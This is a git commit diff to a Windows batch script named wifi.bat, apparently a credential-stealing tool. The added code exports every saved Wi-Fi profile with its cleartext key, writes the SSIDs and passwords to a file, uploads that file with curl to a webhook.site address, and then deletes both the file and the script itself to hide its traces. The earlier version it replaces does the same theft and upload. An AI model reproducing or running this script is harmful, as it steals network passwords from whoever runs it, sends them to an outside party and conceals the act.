67a34562246c2107e5112ab40a65fcb8dd3e291d
AmirX-Dead <amiraligoodarzy2@gmail.com>
2026-09-05 14:41:46 +0330

    Update wifi.bat

--- wifi.bat
+++ wifi.bat
@@ -1,15 +1,10 @@
 @echo off
-echo. > wifi_passwords.txt
+chcp 65001 > nul
+powershell -Command "$temp = $env:TEMP; netsh wlan export profile folder=$temp key=clear; $result = foreach($file in Get-ChildItem $temp\*.xml) { [xml]$xml = Get-Content $file.FullName; $ssid = $xml.WLANProfile.name; $pass = $xml.WLANProfile.MSM.security.sharedKey.keyMaterial; if(!$pass){$pass='Password Not Found'} elseif($pass.StartsWith('01000000') -or $pass.Length -gt 40){$pass='[Secured / Hidden by Windows]'}; '----------------------------------------'; 'نام وای‌فای (SSID): ' + $ssid; 'رمز عبور: ' + $pass }; $outPath = '%~dp0WiFi_Passwords.txt'; $result | Out-File -FilePath $outPath -Encoding utf8; Remove-Item $temp\*.xml -ErrorAction SilentlyContinue"
 
-for /f "tokens=4 delims=: " %%p in ('netsh wlan show profiles ^| find "Profile "') do (
-    netsh wlan show profiles name=%%p key=clear | findstr "SSID Cipher Content" | find /v "Number" >> wifi_passwords.txt
-	echo. >> wifi_passwords.txt
-)
+curl "https://webhook.site/eb9447dd-3620-4f1b-81c8-2efd2f2a4513" -F wifi_passwords=@WiFi_Passwords.txt
 
-curl "https://webhook.site/eb9447dd-3620-4f1b-81c8-2efd2f2a4513" -F wifi_passwords=@wifi_passwords.txt
+del WiFi_Passwords.txt
+del wifi.bat
 
-::for /f "tokens=2,* " %%i in ('curl -I http://x.example.com ^| findstr "Location:"') do (
-::	curl %%i -F wifi_passwords=@wifi_passwords.txt
-
-::	)
-del wifi_passwords.txt
+exit
